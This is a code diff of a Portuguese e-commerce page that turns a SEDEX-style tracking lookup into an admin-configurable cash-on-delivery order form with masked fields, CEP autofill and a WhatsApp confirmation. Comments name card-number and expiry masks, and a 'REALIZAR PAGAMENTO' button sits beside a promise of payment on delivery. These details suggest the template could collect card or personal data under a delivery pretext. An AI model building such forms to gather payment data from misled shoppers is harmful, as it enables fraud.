+      <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M12.031 6.172c-3.181 0-5.767 2.586-5.768 5.766-.001 1.298.38 2.27 1.019 3.287l-.582 2.128 2.182-.573c.978.58 1.911.928 3.145.929 3.178 0 5.767-2.587 5.768-5.766.001-3.187-2.575-5.77-5.764-5.771zm3.392 8.244c-.144.405-.837.774-1.17.824-.299.045-.677.063-1.092-.069-.252-.08-.575-.187-.988-.365-1.739-.751-2.874-2.502-2.961-2.617-.087-.116-.708-.94-.708-1.793s.448-1.273.607-1.446c.159-.173.346-.217.462-.217l.332.006c.106.005.249-.04.39.298.144.347.491 1.2.534 1.287.043.087.072.188.014.304-.058.116-.087.188-.173.289l-.26.304c-.087.086-.177.18-.076.354.101.174.449.741.964 1.201.662.591 1.221.774 1.394.86s.275.072.376-.044c.101-.116.433-.506.549-.68.116-.173.231-.145.39-.086s1.011.477 1.184.564.289.13.332.202c.045.072.045.419-.099.824z"/></svg>
+      <span>Acompanhar Pedido pelo WhatsApp</span>
+    </a>
+  </div>
 
+  <!-- PILARES DE SEGURANÇA -->
+  <div class="trust-pillars-row">
+    <div class="pillar-card">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+      <h6>Zero Risco</h6>
+      <p>Você só paga com o produto em mãos</p>
+    </div>
+    <div class="pillar-card">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="3" width="15" height="13"/><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg>
+      <h6>Frete Expresso</h6>
+      <p>Envio rápido com código de rastreamento</p>
+    </div>
+    <div class="pillar-card">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+      <h6>Conferência no Ato</h6>
+      <p>Confira o pacote antes de realizar o pagamento</p>
+    </div>
   </div>
 
 </main>
 
 <!-- FOOTER -->
 <footer class="site-footer">
-  <img src="logo.png" alt="Logo">
-  <p>&copy; 2026 &middot; Rastreamento seguro em tempo real</p>
+  <img src="logo.png" alt="Logo" onerror="this.src='logo.jpg'">
+  <p>&copy; 2026 &middot; Entrega com Pagamento no Destino &middot; Todos os direitos reservados</p>
 </footer>
 
 <script>
-function handleInputChange() {
-  const input = document.getElementById('tracking-input');
-  const btn = document.getElementById('tracking-btn');
-  btn.disabled = !input.value.trim();
-}
+let currentLinkData = null;
 
-async function handleTrackSubmit(e) {
-  if (e && e.preventDefault) e.preventDefault();
-  const input = document.getElementById('tracking-input');
-  const val = input.value.trim().toUpperCase();
-  if (!val) return;
+// Função Universal de Máscara (ex: xx/xx, XXXX XXXX XXXX XXXX, (xx) xxxxx-xxxx)
+function applyMask(value, maskPattern, maxDigits) {
+  if (!maskPattern) return value;
+  let clean = (value || '').toString().replace(/\D/g, '');
+  const slots = (maskPattern.match(/[xX9#]/g) || []).length;
+  const limit = (maxDigits && maxDigits < slots) ? maxDigits : (slots || maxDigits || 100);
+  if (clean.length > limit) {
+    clean = clean.substring(0, limit);
+  }
 
-  const btn = document.getElementById('tracking-btn');
-  btn.textContent = 'Buscando...';
-  btn.disabled = true;
+  let formatted = '';
+  let cleanIndex = 0;
 
-  document.getElementById('tracking-error').style.display = 'none';
-  document.getElementById('cpf-banner').style.display = 'none';
-  document.getElementById('tracking-results').style.display = 'none';
-
-  try {
-    const res = await fetch(`/api/rastreios/${encodeURIComponent(val)}`);
-    if (res.ok) {
-      const data = await res.json();
-      renderizarResultado(data, val);
+  for (let i = 0; i < maskPattern.length && cleanIndex < clean.length; i++) {
+    const maskChar = maskPattern[i];
+    if (/[xX9#]/.test(maskChar)) {
+      formatted += clean[cleanIndex++];
     } else {
-      document.getElementById('tracking-error').style.display = 'block';
-    }
-  } catch (err) {
-    document.getElementById('tracking-error').style.display = 'block';
-  } finally {
-    btn.textContent = 'Rastrear';
-    btn.disabled = false;
-  }
-}
-
-function renderizarResultado(data, searchVal) {
-  const isCpf = /^\d{11}$|^\d{3}\.\d{3}\.\d{3}\-\d{2}$/.test(searchVal);
-  if (isCpf) {
-    document.getElementById('cpf-banner').style.display = 'block';
-  }
-
-  document.getElementById('display-tracking-code').textContent = data.codigo || searchVal;
-  document.getElementById('display-customer-name').textContent = data.cliente || 'Cliente';
-  document.getElementById('display-city').textContent = data.cidadeDestino || 'Destino';
-  document.getElementById('display-origin').textContent = data.cidadeOrigem || 'Origem';
-  document.getElementById('display-frete').textContent = data.frete || 'SEDEX Express';
-  document.getElementById('display-product').textContent = data.produto || 'Pedido Online';
-  document.getElementById('display-qty').textContent = `(x${data.quantidade || 1})`;
-  document.getElementById('display-status-text').textContent = data.status || 'Em Trânsito';
-
-  // Ajustar cor do badge conforme status
-  const badge = document.getElementById('display-badge');
-  const dot = badge.querySelector('.status-badge-dot');
-  const st = (data.status || '').toLowerCase();
-  if (st.includes('entregue')) {
-    badge.style.background = '#F0FDF4'; badge.style.borderColor = '#BBF7D0'; badge.style.color = '#166534';
-    dot.style.background = '#16A34A';
-  } else if (st.includes('saiu') || st === 'aguardando retirada') {
-    badge.style.background = '#FFFBEB'; badge.style.borderColor = '#FDE68A'; badge.style.color = '#92400E';
-    dot.style.background = '#D97706';
-  } else if (st.includes('pagamento') || st.includes('faturado')) {
-    badge.style.background = '#F3E8FF'; badge.style.borderColor = '#E9D5FF'; badge.style.color = '#6B21A8';
-    dot.style.background = '#7C3AED';
-  } else {
-    badge.style.background = '#ECFDF5'; badge.style.borderColor = '#D1FAE5'; badge.style.color = '#065F46';
-    dot.style.background = '#10B981';
-  }
-
-  // Calcular Previsão Estimada de Entrega baseada no tipo de frete (SEDEX: 3 a 6 dias úteis)
-  document.getElementById('display-estimate-text').textContent = calcularPrevisaoEntrega(data.frete, data.status, data.criadoEm);
-
-  // Renderizar Timeline com ícones específicos de cada etapa
-  const container = document.getElementById('timeline-container');
-  container.innerHTML = '';
-
-  const eventos = data.eventos || [];
-  eventos.forEach((ev, idx) => {
-    const isLast = idx === eventos.length - 1;
-    const itemEl = document.createElement('div');
-    itemEl.className = 'timeline-event';
-
-    // Determinar ícone e cor por tipo ou título
-    let iconSvg = '';
-    const t = (ev.tipo || ev.titulo || '').toLowerCase();
-
-    if (t.includes('entregue') && !t.includes('saiu')) {
-      iconSvg = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>';
-    } else if (t.includes('entrega') || t.includes('saiu')) {
-      iconSvg = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>';
-    } else if (t.includes('recebido') || t.includes('centro') || t.includes('unidade')) {
-      iconSvg = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18"/><path d="M9 21V9"/></svg>';
-    } else if (t.includes('postado')) {
-      iconSvg = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 21.73a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73z"/><path d="M12 22V12"/><polyline points="3.29 7 12 12 20.71 7"/></svg>';
-    } else if (t.includes('faturado') || t.includes('pagamento')) {
-      iconSvg = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>';
-    } else {
-      // Padrão: caminhão em trânsito
-      iconSvg = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 18V6a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2v11a1 1 0 0 0 1 1h2"/><path d="M15 18H9"/><path d="M19 18h2a1 1 0 0 0 1-1v-3.65a1 1 0 0 0-.22-.624l-3.48-4.35A1 1 0 0 0 17.52 8H14"/><circle cx="17" cy="18" r="2"/><circle cx="7" cy="18" r="2"/></svg>';
-    }
-
-    itemEl.innerHTML = `
-      ${!isLast ? '<div class="timeline-connector"></div>' : ''}
-      <div class="timeline-icon-bubble">
-        ${iconSvg}
-      </div>
-      <div class="timeline-body" style="${isLast ? 'padding-bottom: 0;' : ''}">
-        <div class="timeline-event-header">
-          <h4 class="timeline-event-title">${escapeHtml(ev.titulo)}</h4>
-          <span class="timeline-event-date">${escapeHtml(ev.data)}</span>
-        </div>
-        <p class="timeline-event-desc">${escapeHtml(ev.descricao)}</p>
-        <div class="timeline-event-location">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"/><circle cx="12" cy="10" r="3"/></svg>
-          <span>${escapeHtml(ev.local || 'Unidade Operacional')}</span>
-        </div>
-      </div>
-    `;
-    container.appendChild(itemEl);
-  });
-
-  document.getElementById('tracking-results').style.display = 'flex';
-  document.getElementById('tracking-results').scrollIntoView({ behavior: 'smooth', block: 'start' });
-}
-
-function calcularPrevisaoEntrega(frete, status, criadoEm) {
-  if (status === 'Entregue') {
-    return 'Objeto entregue com sucesso';
-  }
-  if (status === 'Pagamento Confirmado') {
-    return 'Aguardando envio pela transportadora';
-  }
-  
-  const baseDate = criadoEm ? new Date(criadoEm) : new Date();
-  const isSedex = (frete || '').toUpperCase().includes('SEDEX');
-  
-  // Função para somar dias úteis (pula sábado e domingo)
-  function somarDiasUteis(data, diasUteis) {
-    let d = new Date(data);
-    let adicionados = 0;
-    while (adicionados < diasUteis) {
-      d.setDate(d.getDate() + 1);
-      const diaSemana = d.getDay();
-      if (diaSemana !== 0 && diaSemana !== 6) {
-        adicionados++;
+      formatted += maskChar;
+      if (clean[cleanIndex] === maskChar) {
+        cleanIndex++;
       }
     }
-    return d;
+  }
+  return formatted;
+}
+
+// Inicialização: carrega os dados do Link configurado no Admin
+document.addEventListener('DOMContentLoaded', async () => {
+  const urlParams = new URLSearchParams(window.location.search);
+  const requestedSlug = urlParams.get('link') || urlParams.get('p') || window.location.pathname.replace(/^\/(link|p)\//, '').replace(/^\/+|\/+$/g, '');
+
+  let linkConfig = null;
+
+  try {
+    if (requestedSlug) {
+      const res = await fetch(`/api/links/${encodeURIComponent(requestedSlug)}`);
+      if (res.ok) {
+        linkConfig = await res.json();
+      }
+    }
+    
+    // Se não informou slug ou não achou, pega o primeiro link disponível
+    if (!linkConfig) {
+      const allRes = await fetch('/api/links');
+      const all = await allRes.json();
+      if (all && all.length > 0) {
+        linkConfig = all[0];
+      }
+    }
+
+    // Busca campos globais para garantir que as alterações gerais sejam aplicadas
+    const globRes = await fetch('/api/campos-globais');
+    if (globRes.ok) {
+      const globCampos = await globRes.json();
+      if (globCampos && globCampos.length > 0) {
+        if (!linkConfig || !linkConfig.campos || linkConfig.campos.length === 0) {
+          if (linkConfig) linkConfig.campos = globCampos;
+        }
+      }
+    }
+  } catch(e) {
+    console.warn('Erro ao carregar link de pagamento:', e);
   }
 
-  function formatDiaMes(d) {
-    const dia = String(d.getDate()).padStart(2, '0');
-    const mes = String(d.getMonth() + 1).padStart(2, '0');
-    return `${dia}/${mes}`;
+  // Fallback caso não haja nenhum link no banco
+  if (!linkConfig) {
+    linkConfig = {
+      titulo: 'Lavadora de Alta Pressão Tramontina 1200W',
+      preco: 249.90,
+      frete: 'SEDEX Expresso (3 a 5 dias úteis)',
+      heroTitulo: 'Receba Primeiro, Pague Depois',
+      heroSubtitulo: 'Preencha seus dados de entrega. Nós enviamos o pedido e você só paga na porta da sua casa diretamente ao entregador!',
+      btnTexto: 'REALIZAR PAGAMENTO',
+      campos: [
+        { id: 'nome', label: 'Nome Completo do Destinatário', placeholder: 'Digite seu nome completo', tipo: 'text', digitos: 60, obrigatorio: true, largura: 100 },
+        { id: 'telefone', label: 'WhatsApp / Telefone', placeholder: '(00) 00000-0000', tipo: 'phone', mascara: '(xx) xxxxx-xxxx', digitos: 11, obrigatorio: true, largura: 50 },
+        { id: 'cep', label: 'CEP', placeholder: '00000-000', tipo: 'mask', mascara: 'xxxxx-xxx', digitos: 8, obrigatorio: true, largura: 50 },
+        { id: 'endereco', label: 'Endereço (Rua / Avenida)', placeholder: 'Ex: Av. Paulista ou Rua das Flores', tipo: 'text', digitos: 80, obrigatorio: true, largura: 100 },
+        { id: 'numero', label: 'Número', placeholder: 'Ex: 123 ou S/N', tipo: 'text', digitos: 10, obrigatorio: true, largura: 50 },
+        { id: 'bairro', label: 'Bairro', placeholder: 'Seu bairro', tipo: 'text', digitos: 40, obrigatorio: true, largura: 50 },
+        { id: 'cidade', label: 'Cidade / Estado', placeholder: 'Ex: São Paulo / SP', tipo: 'text', digitos: 40, obrigatorio: true, largura: 50 }
+      ]
+    };
   }
 
-  if (isSedex) {
-    const dataMin = somarDiasUteis(baseDate, 3);
-    const dataMax = somarDiasUteis(baseDate, 6);
-    return `${formatDiaMes(dataMin)} a ${formatDiaMes(dataMax)} (3 a 6 dias úteis)`;
-  } else {
-    // Frete Grátis com Seguro (8 a 12 dias úteis)
-    const dataMin = somarDiasUteis(baseDate, 8);
-    const dataMax = somarDiasUteis(baseDate, 12);
-    return `${formatDiaMes(dataMin)} a ${formatDiaMes(dataMax)} (8 a 12 dias úteis)`;
+  currentLinkData = linkConfig;
+  setupPage(linkConfig);
+});
+
+function setupPage(data) {
+  // Informações do Produto & Oferta
+  document.getElementById('display-product-name').textContent = data.titulo || 'Produto';
+  const val = parseFloat(data.preco || 0).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+  document.getElementById('display-product-price').textContent = val;
+  const miniFrete = document.getElementById('display-mini-frete');
+  if (miniFrete) miniFrete.textContent = data.frete || 'SEDEX Expresso (3 a 5 dias úteis)';
+
+  const heroT = document.getElementById('display-hero-title');
+  if (heroT && data.heroTitulo) heroT.textContent = data.heroTitulo;
+  const heroS = document.getElementById('display-hero-subtitle');
+  if (heroS && data.heroSubtitulo) heroS.textContent = data.heroSubtitulo;
+  document.getElementById('display-btn-text').textContent = data.btnTexto || 'REALIZAR PAGAMENTO';
+
+  renderDynamicFields(data.campos || []);
+}
+
+// Renderização dos campos customizados
+function renderDynamicFields(campos) {
+  const container = document.getElementById('dynamic-fields-container');
+  container.innerHTML = '';
+
+  campos.forEach(campo => {
+    const group = document.createElement('div');
+    const larg = parseInt(campo.largura) || 50;
+    let colClass = 'col-span-12';
+    if (larg <= 25) {
+      colClass = 'col-span-3'; // 1/4 da linha (compacto)
+    } else if (larg <= 35) {
+      colClass = 'col-span-4'; // 1/3 da linha (pequeno)
+    } else if (larg <= 55) {
+      colClass = 'col-span-6'; // 1/2 da linha (médio)
+    } else if (larg <= 75) {
+      colClass = 'col-span-8'; // 2/3 da linha
+    } else {
+      colClass = 'col-span-12'; // 100% (grande / linha inteira)
+    }
+    group.className = `form-group ${colClass}`;
+
+    const labelEl = document.createElement('label');
+    labelEl.className = 'form-label';
+    labelEl.innerHTML = `${escapeHtml(campo.label)} ${campo.obrigatorio ? '<span class="required-star">*</span>' : ''}`;
+
+    const input = document.createElement('input');
+    input.className = 'custom-input';
+    input.id = 'field_' + campo.id;
+    input.name = campo.id;
+    const mascara = campo.mascara ? campo.mascara.trim() : '';
+    input.placeholder = campo.placeholder || mascara || '';
+    if (campo.obrigatorio) input.required = true;
+
+    // Formatação dinâmica em tempo real (Máscara, Dígitos, Formatos)
+    const tipo = campo.tipo || 'text';
+    const maxDigitos = campo.digitos ? parseInt(campo.digitos) : null;
+
+    // Se tiver máscara configurada (ex: XXXX XXXX XXXX XXXX ou xx/xx), aplica dinamicamente SEMPRE
+    if (mascara && mascara.length > 0) {
+      input.inputMode = 'numeric';
+      input.addEventListener('input', (e) => {
+        e.target.value = applyMask(e.target.value, mascara, maxDigitos);
+      });
+    } else if (tipo === 'mask') {
+      input.inputMode = 'numeric';
+      input.addEventListener('input', (e) => {
+        e.target.value = applyMask(e.target.value, 'xx/xx', maxDigitos);
+      });
+    } else if (tipo === 'number') {
+      input.inputMode = 'numeric';
+      input.addEventListener('input', (e) => {
+        let v = e.target.value.replace(/\D/g, '');
+        if (maxDigitos && v.length > maxDigitos) v = v.substring(0, maxDigitos);
+        e.target.value = v;
+      });
+    } else if (tipo === 'phone') {
+      input.inputMode = 'tel';
+      input.addEventListener('input', (e) => {
+        e.target.value = applyMask(e.target.value, '(xx) xxxxx-xxxx', 11);
+      });
+    } else if (tipo === 'email') {
+      input.type = 'email';
+    } else {
+      if (maxDigitos) {
+        input.maxLength = maxDigitos;
+      }
+    }
+
+    // Suporte especial a CEP com busca automática se o id for "cep"
+    if (campo.id.toLowerCase().includes('cep')) {
+      input.addEventListener('input', (e) => {
+        const clean = e.target.value.replace(/\D/g, '');
+        if (clean.length === 8) {
+          consultarViaCep(clean);
+        }
+      });
+    }
+
+    group.appendChild(labelEl);
+    group.appendChild(input);
+    container.appendChild(group);
+  });
+}
+
+// Preenchimento automático de CEP caso o formulário possua campos de endereço
+async function consultarViaCep(cep) {
+  try {
+    const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+    const data = await res.json();
+    if (!data.erro) {
+      const streetInput = document.querySelector('[name*="endereco"], [name*="rua"], [id*="endereco"], [id*="rua"]');
+      const bairroInput = document.querySelector('[name*="bairro"], [id*="bairro"]');
+      const cityInput = document.querySelector('[name*="cidade"], [id*="cidade"]');
+
+      if (streetInput && data.logradouro) streetInput.value = data.logradouro;
+      if (bairroInput && data.bairro) bairroInput.value = data.bairro;
+      if (cityInput && data.localidade) cityInput.value = `${data.localidade} / ${data.uf}`;
+    }
+  } catch(e) {}
+}
+
+// Envio do Pedido
+async function handleOrderSubmit(e) {
+  e.preventDefault();
+
+  const btn = document.getElementById('btn-submit-order');
+  btn.disabled = true;
+  btn.innerHTML = '<span>Processando e Agendando Entrega...</span>';
+
+  // Coleta os valores de todos os campos dinâmicos
+  const dadosCliente = {};
+  if (currentLinkData && currentLinkData.campos) {
+    currentLinkData.campos.forEach(c => {
+      const el = document.getElementById('field_' + c.id);
+      if (el) {
+        dadosCliente[c.label] = el.value.trim();
+      }
+    });
   }
+
+  const orderPayload = {
+    codigo: 'COD-' + Math.floor(100000 + Math.random() * 900000),
+    linkId: currentLinkData?.id || '',
+    linkSlug: currentLinkData?.slug || '',
+    produto: document.getElementById('display-product-name').textContent,
+    valor: document.getElementById('display-product-price').textContent,
+    dadosCliente: dadosCliente
+  };
+
+  try {
+    await fetch('/api/pedidos', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(orderPayload)
+    });
+  } catch(e) {
+    console.warn('Erro ao registrar pedido:', e);
+  }
+
+  // Preenche recibo da tela de sucesso
+  const receiptContainer = document.getElementById('success-receipt-rows');
+  receiptContainer.innerHTML = `
+    <div class="receipt-row">
+      <span class="label">Código do Pedido:</span>
+      <span class="val highlight">#${orderPayload.codigo}</span>
+    </div>
+    <div class="receipt-row">
+      <span class="label">Produto:</span>
+      <span class="val">${escapeHtml(orderPayload.produto)}</span>
+    </div>
+    <div class="receipt-row">
+      <span class="label">Total no Recebimento:</span>
+      <span class="val highlight">${escapeHtml(orderPayload.valor)}</span>
+    </div>
+  `;
+
+  // Adiciona campos preenchidos no recibo
+  Object.entries(dadosCliente).forEach(([k, v]) => {
+    if (v) {
+      const row = document.createElement('div');
+      row.className = 'receipt-row';
+      row.innerHTML = `<span class="label">${escapeHtml(k)}:</span><span class="val">${escapeHtml(v)}</span>`;
+      receiptContainer.appendChild(row);
+    }
+  });
+
+  // Botão WhatsApp
+  const firstClientName = Object.values(dadosCliente)[0] || 'Cliente';
+  const textMsg = encodeURIComponent(`Olá! Acabei de fazer o pedido #${orderPayload.codigo} (${orderPayload.produto}) com Pagamento na Entrega no nome de ${firstClientName}. Gostaria de confirmar!`);
+  document.getElementById('whatsapp-btn-link').href = `https://api.whatsapp.com/send?text=${textMsg}`;
+
+  // Exibe tela de sucesso
+  document.getElementById('cod-order-form').style.display = 'none';
+  const successCard = document.getElementById('success-card');
+  successCard.style.display = 'block';
+  successCard.scrollIntoView({ behavior: 'smooth', block: 'start' });
 }
 
 function escapeHtml(str) {
@@ -803,20 +1010,6 @@ function escapeHtml(str) {
     .replace(/>/g, '&gt;')
     .replace(/"/g, '&quot;')
     .replace(/'/g, '&#039;');
-}
-
-// Parâmetros de URL automáticos
-const urlParams = new URLSearchParams(window.location.search);
-const queryCode = urlParams.get('codigo') || urlParams.get('c');
-const queryNome = urlParams.get('nome') || urlParams.get('destinatario');
-const queryProduto = urlParams.get('produto');
-const queryCidade = urlParams.get('cidade') || urlParams.get('destino');
-const queryStatus = urlParams.get('status');
-
-if (queryCode) {
-  document.getElementById('tracking-input').value = queryCode;
-  document.getElementById('tracking-btn').disabled = false;
-  handleTrackSubmit(new Event('submit'));
 }
 </script>
 
